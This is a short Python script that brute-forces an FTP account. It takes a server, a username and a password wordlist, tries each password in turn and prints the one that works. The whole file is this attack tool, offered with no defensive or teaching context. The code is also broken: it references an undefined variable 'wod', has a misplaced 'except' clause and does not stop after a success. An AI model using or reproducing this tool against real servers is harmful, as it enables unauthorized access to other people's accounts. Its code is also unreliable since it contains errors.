#!/usr/bin/python3
import ftplib

server=input("FTP server:")
user=input("Username:")
PasswordList= input("Path to password list >")
try:
    with open(PasswordList,"r") as pw:
        for word in pw:
            word=wod.strip("\r").strip("\n")
            try:
                ftp = ftplib.FTP(server)
                ftp.login(user, word)
                print("Succes! The password is: "+word)
            except:
                print("Still trying...")
        except:
            print("Wordlist error")

